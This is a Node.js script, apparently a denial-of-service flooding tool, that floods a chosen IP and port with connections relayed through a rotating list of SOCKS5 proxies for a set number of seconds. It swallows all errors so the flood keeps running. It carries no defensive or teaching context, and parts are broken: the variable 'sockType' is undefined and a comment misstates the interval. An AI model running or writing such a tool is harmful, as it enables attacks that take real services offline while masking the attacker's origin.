const fs = require('fs');
const SocksClient = require('socks').SocksClient;

// Command-line arguments
const target = process.argv[2];
const port = process.argv[3];
const proxyListFile = process.argv[4];
const time = process.argv[5];
const connectionsPerInterval = process.argv[6] || 10; // Default to 10 if not provided

// Validate command-line arguments
if (!target || !port || !proxyListFile || !time) {
  console.error('Usage: node socket-high.js <IP> <PORT> <LIST> <TIME> [CONNECTIONS_PER_INTERVAL Default to 10 if not provided]');
  process.exit(1);
}

const proxies = fs.readFileSync(proxyListFile, 'utf-8').replace(/\r/g, '').split('\n');
let theproxy = 0;
let proxy = proxies[theproxy];

process.on('uncaughtException', function (e) {});
process.on('unhandledRejection', function (e) {});

const int = setInterval(() => {
  for (let i = 0; i < connectionsPerInterval; i++) {
    theproxy++;
    if (theproxy === proxies.length - 1) {
      theproxy = 0;
    }
    proxy = proxies[theproxy];
    if (proxy && proxy.length > 5) {
      proxy = proxy.split(':');
    } else {
      return false;
    }


    const options = {
      proxy: {
        host: proxy[0],
        port: Number(proxy[1]),
        timeout: 0,
        type: 5
      },
      command: 'connect',
      destination: {
        host: target,
        port: Number(port)
      }
    };

    SocksClient.createConnection(options, (err, info) => {
      if (!err) {
        console.log(`Connected to ${target}:${port} -> ${proxy[0]}:${proxy[1]} using SOCKS${sockType}`);
      } else {
        console.error(`Error connecting to ${target}:${port} via proxy ${proxy[0]}:${proxy[1]} using SOCKS${sockType}: ${err.message}`);
      }
    });
  }
}, 0); // interval time set to 25ms

console.log(`Sending flood to ${target}:${port} for ${time} seconds with ${connectionsPerInterval} connections per interval`);
setTimeout(() => clearInterval(int), time * 1000);
setTimeout(() => process.exit(0), time * 1000);